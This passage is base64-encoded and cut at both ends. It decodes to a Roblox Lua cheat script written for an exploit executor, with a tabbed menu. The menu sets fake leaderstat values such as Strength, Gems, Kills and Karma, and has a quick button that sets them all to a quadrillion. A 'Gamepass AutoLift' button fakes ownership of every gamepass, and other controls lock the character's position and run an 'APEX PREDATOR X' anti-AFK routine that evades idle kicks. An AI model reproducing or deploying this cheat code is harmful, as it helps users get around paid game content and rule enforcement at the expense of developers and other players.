R1cm4gMAplbmQKCi0tIEZ1bmN0aW9uIHRvIHVwZGF0ZSBkaXNwbGF5ZWQgc3RhdHMgaW4gdGhlIGdhbWUKbG9jYWwgZnVuY3Rpb24gdXBkYXRlR2FtZVN0YXRzKCkKICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgCiAgICAtLSBVcGRhdGUgbGVhZGVyc3RhdHMKICAgIGxvY2FsIGxlYWRlcnN0YXRzID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJsZWFkZXJzdGF0cyIpCiAgICBpZiBsZWFkZXJzdGF0cyB0aGVuCiAgICAgICAgLS0gU3RyZW5ndGgKICAgICAgICBsb2NhbCBzdHJlbmd0aCA9IGxlYWRlcnN0YXRzOkZpbmRGaXJzdENoaWxkKCJTdHJlbmd0aCIpCiAgICAgICAgaWYgc3RyZW5ndGggYW5kIHRvZ2dsZVN0YXRlcy5TdHJlbmd0aCB0aGVuCiAgICAgICAgICAgIHN0cmVuZ3RoLlZhbHVlID0gZmFrZVN0YXRzLlN0cmVuZ3RoCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gUmViaXJ0aHMKICAgICAgICBsb2NhbCByZWJpcnRocyA9IGxlYWRlcnN0YXRzOkZpbmRGaXJzdENoaWxkKCJSZWJpcnRocyIpCiAgICAgICAgaWYgcmViaXJ0aHMgYW5kIHRvZ2dsZVN0YXRlcy5SZWJpcnRocyB0aGVuCiAgICAgICAgICAgIHJlYmlydGhzLlZhbHVlID0gZmFrZVN0YXRzLlJlYmlydGhzCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gS2lsbHMKICAgICAgICBsb2NhbCBraWxscyA9IGxlYWRlcnN0YXRzOkZpbmRGaXJzdENoaWxkKCJLaWxscyIpCiAgICAgICAgaWYga2lsbHMgYW5kIHRvZ2dsZVN0YXRlcy5LaWxscyB0aGVuCiAgICAgICAgICAgIGtpbGxzLlZhbHVlID0gZmFrZVN0YXRzLktpbGxzCiAgICAgICAgZWxzZWlmIHRvZ2dsZVN0YXRlcy5LaWxscyB0aGVuCiAgICAgICAgICAgIGtpbGxzID0gSW5zdGFuY2UubmV3KCJJbnRWYWx1ZSIpCiAgICAgICAgICAgIGtpbGxzLk5hbWUgPSAiS2lsbHMiCiAgICAgICAgICAgIGtpbGxzLlZhbHVlID0gZmFrZVN0YXRzLktpbGxzCiAgICAgICAgICAgIGtpbGxzLlBhcmVudCA9IGxlYWRlcnN0YXRzCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gQnJhd2xzCiAgICAgICAgbG9jYWwgYnJhd2xzID0gbGVhZGVyc3RhdHM6RmluZEZpcnN0Q2hpbGQoIkJyYXdscyIpCiAgICAgICAgaWYgYnJhd2xzIGFuZCB0b2dnbGVTdGF0ZXMuQnJhd2xzIHRoZW4KICAgICAgICAgICAgYnJhd2xzLlZhbHVlID0gZmFrZVN0YXRzLkJyYXdscwogICAgICAgIGVsc2VpZiB0b2dnbGVTdGF0ZXMuQnJhd2xzIHRoZW4KICAgICAgICAgICAgYnJhd2xzID0gSW5zdGFuY2UubmV3KCJJbnRWYWx1ZSIpCiAgICAgICAgICAgIGJyYXdscy5OYW1lID0gIkJyYXdscyIKICAgICAgICAgICAgYnJhd2xzLlZhbHVlID0gZmFrZVN0YXRzLkJyYXdscwogICAgICAgICAgICBicmF3bHMuUGFyZW50ID0gbGVhZGVyc3RhdHMKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICAtLSBVcGRhdGUgRHVyYWJpbGl0eQogICAgbG9jYWwgZHVyYWJpbGl0eSA9IHBsYXllcjpGaW5kRmlyc3RDaGlsZCgiRHVyYWJpbGl0eSIpCiAgICBpZiBkdXJhYmlsaXR5IGFuZCB0b2dnbGVTdGF0ZXMuRHVyYWJpbGl0eSB0aGVuCiAgICAgICAgZHVyYWJpbGl0eS5WYWx1ZSA9IGZha2VTdGF0cy5EdXJhYmlsaXR5CiAgICBlbmQKICAgIAogICAgLS0gVXBkYXRlIEdlbXMgKHVuZGVyIHBsYXllcikKICAgIGxvY2FsIGdlbXMgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIkdlbXMiKQogICAgaWYgZ2VtcyBhbmQgdG9nZ2xlU3RhdGVzLkdlbXMgdGhlbgogICAgICAgIGdlbXMuVmFsdWUgPSBmYWtlU3RhdHMuR2VtcwogICAgZWxzZWlmIHRvZ2dsZVN0YXRlcy5HZW1zIHRoZW4KICAgICAgICBnZW1zID0gSW5zdGFuY2UubmV3KCJJbnRWYWx1ZSIpCiAgICAgICAgZ2Vtcy5OYW1lID0gIkdlbXMiCiAgICAgICAgZ2Vtcy5WYWx1ZSA9IGZha2VTdGF0cy5HZW1zCiAgICAgICAgZ2Vtcy5QYXJlbnQgPSBwbGF5ZXIKICAgIGVuZAogICAgCiAgICAtLSBVcGRhdGUgQWdpbGl0eQogICAgbG9jYWwgYWdpbGl0eSA9IHBsYXllcjpGaW5kRmlyc3RDaGlsZCgiQWdpbGl0eSIpCiAgICBpZiBhZ2lsaXR5IGFuZCB0b2dnbGVTdGF0ZXMuQWdpbGl0eSB0aGVuCiAgICAgICAgYWdpbGl0eS5WYWx1ZSA9IGZha2VTdGF0cy5BZ2lsaXR5CiAgICBlbHNlaWYgdG9nZ2xlU3RhdGVzLkFnaWxpdHkgdGhlbgogICAgICAgIGFnaWxpdHkgPSBJbnN0YW5jZS5uZXcoIkludFZhbHVlIikKICAgICAgICBhZ2lsaXR5Lk5hbWUgPSAiQWdpbGl0eSIKICAgICAgICBhZ2lsaXR5LlZhbHVlID0gZmFrZVN0YXRzLkFnaWxpdHkKICAgICAgICBhZ2lsaXR5LlBhcmVudCA9IHBsYXllcgogICAgZW5kCiAgICAKICAgIC0tIFVwZGF0ZSBLYXJtYQogICAgbG9jYWwgZ29vZEthcm1hID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJnb29kS2FybWEiKQogICAgaWYgZ29vZEthcm1hIGFuZCB0b2dnbGVTdGF0ZXMuR29vZEthcm1hIHRoZW4KICAgICAgICBnb29kS2FybWEuVmFsdWUgPSBmYWtlU3RhdHMuR29vZEthcm1hCiAgICBlbHNlaWYgdG9nZ2xlU3RhdGVzLkdvb2RLYXJtYSB0aGVuCiAgICAgICAgZ29vZEthcm1hID0gSW5zdGFuY2UubmV3KCJJbnRWYWx1ZSIpCiAgICAgICAgZ29vZEthcm1hLk5hbWUgPSAiZ29vZEthcm1hIgogICAgICAgIGdvb2RLYXJtYS5WYWx1ZSA9IGZha2VTdGF0cy5Hb29kS2FybWEKICAgICAgICBnb29kS2FybWEuUGFyZW50ID0gcGxheWVyCiAgICBlbmQKICAgIAogICAgbG9jYWwgZXZpbEthcm1hID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJldmlsS2FybWEiKQogICAgaWYgZXZpbEthcm1hIGFuZCB0b2dnbGVTdGF0ZXMuRXZpbEthcm1hIHRoZW4KICAgICAgICBldmlsS2FybWEuVmFsdWUgPSBmYWtlU3RhdHMuRXZpbEthcm1hCiAgICBlbHNlaWYgdG9nZ2xlU3RhdGVzLkV2aWxLYXJtYSB0aGVuCiAgICAgICAgZXZpbEthcm1hID0gSW5zdGFuY2UubmV3KCJJbnRWYWx1ZSIpCiAgICAgICAgZXZpbEthcm1hLk5hbWUgPSAiZXZpbEthcm1hIgogICAgICAgIGV2aWxLYXJtYS5WYWx1ZSA9IGZha2VTdGF0cy5FdmlsS2FybWEKICAgICAgICBldmlsS2FybWEuUGFyZW50ID0gcGxheWVyCiAgICBlbmQKZW5kCgotLSBJbnN0cnVjdGlvbnMgU2VjdGlvbgpGYWtlU3RhdHNUYWI6U2VjdGlvbih7VGl0bGUgPSAiSW5zdHJ1Y3Rpb25zIn0pCkZha2VTdGF0c1RhYjpMYWJlbCh7VGl0bGUgPSAi8J+TnSBIb3cgdG8gVXNlIiwgRGVzYyA9ICJUb2dnbGUgT04gZm9yIGVhY2ggc3RhdCB0byBlbmFibGUgZmFrZSBzdGF0In0pCkZha2VTdGF0c1RhYjpMYWJlbCh7VGl0bGUgPSAi8J+SoSBGb3JtYXQiLCBEZXNjID0gIjEwMDAgb3IgMUsgb3IgMS41TSBvciAyLjNCIChNYXg6IDEwMDAwUWEpIn0pCgotLSBIZWxwZXIgZnVuY3Rpb24gdG8gY3JlYXRlIHN0YXQgY29udHJvbHMKbG9jYWwgZnVuY3Rpb24gY3JlYXRlU3RhdENvbnRyb2woc3RhdE5hbWUsIGRpc3BsYXlOYW1lLCBkZXNjcmlwdGlvbikKICAgIEZha2VTdGF0c1RhYjpTZWN0aW9uKHtUaXRsZSA9IGRpc3BsYXlOYW1lfSkKICAgIAogICAgbG9jYWwgaW5wdXQgPSBGYWtlU3RhdHNUYWI6VGV4dGJveCh7CiAgICAgICAgVGl0bGUgPSBkaXNwbGF5TmFtZSAuLiAiIFZhbHVlIiwKICAgICAgICBEZXNjID0gZGVzY3JpcHRpb24sCiAgICAgICAgUGxhY2Vob2xkZXIgPSAiZS5nLiwgMTAwMCBvciAxSyBvciAxLjVNIiwKICAgICAgICBWYWx1ZSA9ICIiLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odGV4dCkKICAgICAgICAgICAgbG9jYWwgdmFsdWUgPSBwYXJzZU51bWJlcih0ZXh0KQogICAgICAgICAgICBmYWtlU3RhdHNbc3RhdE5hbWVdID0gdmFsdWUKICAgICAgICAgICAgaWYgdG9nZ2xlU3RhdGVzW3N0YXROYW1lXSB0aGVuCiAgICAgICAgICAgICAgICB1cGRhdGVHYW1lU3RhdHMoKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIEZha2VTdGF0c1RhYjpUb2dnbGUoewogICAgICAgIFRpdGxlID0gZGlzcGxheU5hbWUgLi4gIiBUb2dnbGUiLAogICAgICAgIERlc2MgPSAiRW5hYmxlIGZha2UgIiAuLiBkaXNwbGF5TmFtZTpsb3dlcigpLAogICAgICAgIFZhbHVlID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgdG9nZ2xlU3RhdGVzW3N0YXROYW1lXSA9IHN0YXRlCiAgICAgICAgICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICAgICAgICAgIHVwZGF0ZUdhbWVTdGF0cygpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfSkKZW5kCgotLSBDcmVhdGUgYWxsIHN0YXQgY29udHJvbHMKY3JlYXRlU3RhdENvbnRyb2woIlN0cmVuZ3RoIiwgIlN0cmVuZ3RoIiwgIkZha2Ugc3RyZW5ndGggc3RhdCIpCmNyZWF0ZVN0YXRDb250cm9sKCJEdXJhYmlsaXR5IiwgIkR1cmFiaWxpdHkiLCAiRmFrZSBkdXJhYmlsaXR5IHN0YXQiKSAKY3JlYXRlU3RhdENvbnRyb2woIlJlYmlydGhzIiwgIlJlYmlydGhzIiwgIkZha2UgcmViaXJ0aHMgY291bnQiKQpjcmVhdGVTdGF0Q29udHJvbCgiR2VtcyIsICJHZW1zIiwgIkZha2UgZ2VtcyBhbW91bnQiKQpjcmVhdGVTdGF0Q29udHJvbCgiS2lsbHMiLCAiS2lsbHMiLCAiRmFrZSBraWxscyBjb3VudCIpCmNyZWF0ZVN0YXRDb250cm9sKCJCcmF3bHMiLCAiQnJhd2xzIiwgIkZha2UgYnJhd2xzIGNvdW50IikKY3JlYXRlU3RhdENvbnRyb2woIkFnaWxpdHkiLCAiQWdpbGl0eSIsICJGYWtlIGFnaWxpdHkgc3RhdCIpCmNyZWF0ZVN0YXRDb250cm9sKCJHb29kS2FybWEiLCAiR29vZCBLYXJtYSIsICJGYWtlIGdvb2Qga2FybWEiKQpjcmVhdGVTdGF0Q29udHJvbCgiRXZpbEthcm1hIiwgIkV2aWwgS2FybWEiLCAiRmFrZSBldmlsIGthcm1hIikKCi0tIFF1aWNrIFNldCBTZWN0aW9uCkZha2VTdGF0c1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJRdWljayBTZXQifSkKCkZha2VTdGF0c1RhYjpCdXR0b24oewogICAgVGl0bGUgPSAiU2V0IEFsbCB0byAxUWEiLAogICAgRGVzYyA9ICJRdWlja2x5IHNldCBhbGwgc3RhdHMgdG8gMSBRdWFkcmlsbGlvbiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBmb3Igc3RhdE5hbWUgaW4gcGFpcnMoZmFrZVN0YXRzKSBkbwogICAgICAgICAgICBmYWtlU3RhdHNbc3RhdE5hbWVdID0gMTAwMDAwMDAwMDAwMDAwMAogICAgICAgICAgICB0b2dnbGVTdGF0ZXNbc3RhdE5hbWVdID0gdHJ1ZQogICAgICAgIGVuZAogICAgICAgIHVwZGF0ZUdhbWVTdGF0cygpCiAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIlF1aWNrIFNldCIsCiAgICAgICAgICAgIERlc2MgPSAiQWxsIHN0YXRzIHNldCB0byAxUWEgYW5kIGVuYWJsZWQhIiwKICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICB9KQogICAgZW5kCn0pCgpGYWtlU3RhdHNUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIkRpc2FibGUgQWxsIFN0YXRzIiwKICAgIERlc2MgPSAiVHVybiBvZmYgYWxsIGZha2Ugc3RhdHMiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgZm9yIHN0YXROYW1lIGluIHBhaXJzKHRvZ2dsZVN0YXRlcykgZG8KICAgICAgICAgICAgdG9nZ2xlU3RhdGVzW3N0YXROYW1lXSA9IGZhbHNlCiAgICAgICAgZW5kCiAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIkZha2UgU3RhdHMiLAogICAgICAgICAgICBEZXNjID0gIkFsbCBmYWtlIHN0YXRzIGRpc2FibGVkISIsCiAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgfSkKICAgIGVuZAp9KQoKLS0gTWlzYyBUYWIKbG9jYWwgTWlzY1RhYiA9IFdpbmRvdzpUYWIoe1RpdGxlID0gIk1pc2MiLCBJY29uID0gInNldHRpbmdzIn0pCgotLSBVdGlsaXR5IFNlY3Rpb24KTWlzY1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJVdGlsaXR5In0pCgpNaXNjVGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJHYW1lcGFzcyBBdXRvTGlmdCIsCiAgICBEZXNjID0gIlVubG9jayBhbGwgZ2FtZXBhc3NlcyIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBnYW1lcGFzc0ZvbGRlciA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5nYW1lcGFzc0lkcwogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICAgICAgZm9yIF8sIGdhbWVwYXNzIGluIHBhaXJzKGdhbWVwYXNzRm9sZGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGxvY2FsIHZhbHVlID0gSW5zdGFuY2UubmV3KCJJbnRWYWx1ZSIpCiAgICAgICAgICAgIHZhbHVlLk5hbWUgPSBnYW1lcGFzcy5OYW1lCiAgICAgICAgICAgIHZhbHVlLlZhbHVlID0gZ2FtZXBhc3MuVmFsdWUKICAgICAgICAgICAgdmFsdWUuUGFyZW50ID0gcGxheWVyLm93bmVkR2FtZXBhc3NlcwogICAgICAgIGVuZAogICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJHYW1lcGFzcyBBdXRvTGlmdCIsCiAgICAgICAgICAgIERlc2MgPSAiQWxsIGdhbWVwYXNzZXMgdW5sb2NrZWQhIiwKICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICB9KQogICAgZW5kCn0pCgotLSBQZXJmb3JtYW5jZSBTZWN0aW9uCk1pc2NUYWI6U2VjdGlvbih7VGl0bGUgPSAiUGVyZm9ybWFuY2UifSkKCk1pc2NUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkhpZGUgRnJhbWVzIiwKICAgIERlc2MgPSAiVmVyeSBPcCIsCiAgICBWYWx1ZSA9IGZhbHNlLCAtLSBEZWZhdWx0IE9GRgogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBmb3IgXywgb2JqIGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKTpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiBvYmouTmFtZTptYXRjaCgiRnJhbWUkIikgdGhlbgogICAgICAgICAgICAgICAgb2JqLlZpc2libGUgPSBub3Qgc3RhdGUKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIENoYXJhY3RlciBTZWN0aW9uCk1pc2NUYWI6U2VjdGlvbih7VGl0bGUgPSAiQ2hhcmFjdGVyIn0pCgpNaXNjVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJQb3NpdGlvbiBMb2NrIiwKICAgIERlc2MgPSAiTG9jayB5b3VyIGNoYXJhY3RlciBpbiBwbGFjZSIsCiAgICBWYWx1ZSA9IGZhbHNlLCAtLSBEZWZhdWx0IE9GRgogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgICAgIGxvY2FsIGN1cnJlbnRQb3MgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCiAgICAgICAgICAgIGdldGdlbnYoKS5wb3NMb2NrID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikuSGVhcnRiZWF0OkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gY3VycmVudFBvcwogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgICAgICBUaXRsZSA9ICJQb3NpdGlvbiBMb2NrIiwKICAgICAgICAgICAgICAgIERlc2MgPSAiUG9zaXRpb24gbG9ja2VkIGluIHBsYWNlISIsCiAgICAgICAgICAgICAgICBUaW1lID0gMwogICAgICAgICAgICB9KQogICAgICAgIGVsc2UKICAgICAgICAgICAgaWYgZ2V0Z2VudigpLnBvc0xvY2sgdGhlbgogICAgICAgICAgICAgICAgZ2V0Z2VudigpLnBvc0xvY2s6RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICBnZXRnZW52KCkucG9zTG9jayA9IG5pbAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgICAgICBUaXRsZSA9ICJQb3NpdGlvbiBMb2NrIiwKICAgICAgICAgICAgICAgIERlc2MgPSAiUG9zaXRpb24gbG9jayBkaXNhYmxlZCEiLAogICAgICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICAgICAgfSkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gQW50aSBBRksgU2VjdGlvbgpNaXNjVGFiOlNlY3Rpb24oe1RpdGxlID0gIkFudGkgQUZLIn0pCgoKTWlzY1RhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiQW50aSBBRksiLAogICAgRGVzYyA9ICJQcmV2ZW50IGJlaW5nIGtpY2tlZCBmb3IgaW5hY3Rpdml0eSIsCiAgICBWYWx1ZSA9IHRydWUsIC0tIERlZmF1bHQgT0ZGCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICAgICAgLS0gQ3JlYXRlIEZhZGluZyBEaXNwbGF5CiAgICAgICAgICAgIGxvY2FsIERpc3BsYXlHdWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIpCiAgICAgICAgICAgIGxvY2FsIERpc3BsYXlMYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgICAgICAgICAgbG9jYWwgVGltZXJMYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgICAgICAgICAgCiAgICAgICAgICAgIERpc3BsYXlHdWkuTmFtZSA9ICJBbnRpQUZLRGlzcGxheSIKICAgICAgICAgICAgRGlzcGxheUd1aS5QYXJlbnQgPSBnYW1lLkNvcmVHdWkKICAgICAgICAgICAgRGlzcGxheUd1aS5aSW5kZXhCZWhhdmlvciA9IEVudW0uWkluZGV4QmVoYXZpb3IuU2libGluZwogICAgICAgICAgICAKICAgICAgICAgICAgRGlzcGxheUxhYmVsLk5hbWUgPSAiRGlzcGxheUxhYmVsIgogICAgICAgICAgICBEaXNwbGF5TGFiZWwuUGFyZW50ID0gRGlzcGxheUd1aQogICAgICAgICAgICBEaXNwbGF5TGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgRGlzcGxheUxhYmVsLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNCwgMCwgMC4wMSwgMCkKICAgICAgICAgICAgRGlzcGxheUxhYmVsLlNpemUgPSBVRGltMi5uZXcoMC4yLCAwLCAwLCAzMCkKICAgICAgICAgICAgRGlzcGxheUxhYmVsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQmxhY2sKICAgICAgICAgICAgRGlzcGxheUxhYmVsLlRleHQgPSAiQVBFWCBQUkVEQVRPUiBYIC0gQU5USSBBRksiCiAgICAgICAgICAgIERpc3BsYXlMYWJlbC5UZXh0U2l6ZSA9IDE4CiAgICAgICAgICAgIERpc3BsYXlMYWJlbC5UZXh0VHJhbnNwYXJlbmN5ID0gMAogICAgICAgICAgICBEaXNwbGF5TGFiZWwuVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkNlbnRlcgogICAgICAgICAgICAKICAgICAgICAgICAgLS0gR3JhZGllbnQgZm9yIERpc3BsYXlMYWJlbAogICAgICAgICAgICBsb2NhbCBkaXNwbGF5R3JhZGllbnQgPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiKQogICAgICAgICAgICBkaXNwbGF5R3JhZGllbnQuQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ldyh7CiAgICAgICAgICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAsIENvbG9yMy5mcm9tUkdCKDI4LCAyMTYsIDIxMCkpLCAgIC0tICMxQ0Q4RDIKICAgICAgICAgICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgQ29sb3IzLmZyb21SR0IoMTQ3LCAyMzcsIDE5OSkpICAgLS0gIzkzRURDNwogICAgICAgICAgICB9KQogICAgICAgICAgICBkaXNwbGF5R3JhZGllbnQuUm90YXRpb24gPSAwCiAgICAgICAgICAgIGRpc3BsYXlHcmFkaWVudC5QYXJlbnQgPSBEaXNwbGF5TGFiZWwKICAgICAgICAgICAgCiAgICAgICAgICAgIFRpbWVyTGFiZWwuTmFtZSA9ICJUaW1lckxhYmVsIgogICAgICAgICAgICBUaW1lckxhYmVsLlBhcmVudCA9IERpc3BsYXlHdWkKICAgICAgICAgICAgVGltZXJMYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICBUaW1lckxhYmVsLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNCwgMCwgMC4wNDUsIDApCiAgICAgICAgICAgIFRpbWVyTGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygwLjIsIDAsIDAsIDMwKQogICAgICAgICAgICBUaW1lckxhYmVsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgICAgICBUaW1lckxhYmVsLlRleHQgPSAiMDA6MDA6MDAiCiAgICAgICAgICAgIFRpbWVyTGFiZWwuVGV4dFNpemUgPSAxMgogICAgICAgICAgICBUaW1lckxhYmVsLlRleHRUcmFuc3BhcmVuY3kgPSAwCiAgICAgICAgICAgIFRpbWVyTGFiZWwuVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkNlbnRlcgogICAgICAgICAgICAKICAgICAgICAgICAgLS0gR3JhZGllbnQgZm9yIFRpbWVyTGFiZWwKICAgICAgICAgICAgbG9jYWwgdGltZXJHcmFkaWVudCA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIpCiAgICAgICAgICAgIHRpbWVyR3JhZGllbnQuQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ldyh7CiAgICAgICAgICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAsIENvbG9yMy5mcm9tUkdCKDI4LCAyMTYsIDIxMCkpLCAgIC0tICMxQ0Q4RDIKICAgICAgICAgICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgQ29sb3IzLmZyb21SR0IoMTQ3LCAyMzcsIDE5OSkpICAgLS0gIzkzRURDNwogICAgICAgICAgICB9KQogICAgICAgICAgICB0aW1lckdyYWRpZW50LlJvdGF0aW9uID0gMAogICAgICAgICAgICB0aW1lckdyYWRpZW50LlBhcmVudCA9IFRpbWVyTGFiZWwKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIEFuaW1hdGUgZ3JhZGllbnRzCiAgICAgICAgICAgIF9HLmFuaW1hdGVHcmFkaWVudHMgPSB0cnVlCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgX0cuYW5pbWF0ZUdyYWRpZW50cyBkbwogICAgICAgICAgICAgICAgICAgIGZvciBpID0gMCwgMzYwLCAyIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBfRy5hbmltYXRlR3JhZGllbnRzIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGRpc3BsYXlHcmFkaWVudC5Sb3RhdGlvbiA9IGkKICAgICAgICAgICAgICAgICAgICAgICAgdGltZXJHcmFkaWVudC5Sb3RhdGlvbiA9IGkKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDMpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAKICAgICAgICAgICAgLS0gQW5pbWF0aW9uIGxvb3AgZm9yIGZhZGluZwogICAgICAgICAgICBfRy5kaXNwbGF5QUZLID0gdHJ1ZQogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIF9HLmRpc3BsYXlBRksgZG8KICAgICAgICAgICAgICAgICAgICAtLSBGYWRlIG91dCBib3RoCiAgICAgICAgICAgICAgICAgICAgZm9yIGkgPSAwLCAxLCAwLjEgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IF9HLmRpc3BsYXlBRksgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgRGlzcGxheUxhYmVsLlRleHRUcmFuc3BhcmVuY3kgPSBpCiAgICAgICAgICAgICAgICAgICAgICAgIFRpbWVyTGFiZWwuVGV4dFRyYW5zcGFyZW5jeSA9IGkKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDUpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IF9HLmRpc3BsYXlBRksgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIC0tIEZhZGUgaW4gYm90aAogICAgICAgICAgICAgICAgICAgIGZvciBpID0gMSwgMCwgLTAuMSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgX0cuZGlzcGxheUFGSyB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBEaXNwbGF5TGFiZWwuVGV4dFRyYW5zcGFyZW5jeSA9IGkKICAgICAgICAgICAgICAgICAgICAgICAgVGltZXJMYWJlbC5UZXh0VHJhbnNwYXJlbmN5ID0gaQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wNSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiBub3QgX0cuZGlzcGxheUFGSyB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgzKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIFRpbWVyCiAgICAgICAgICAgIGxvY2FsIHNl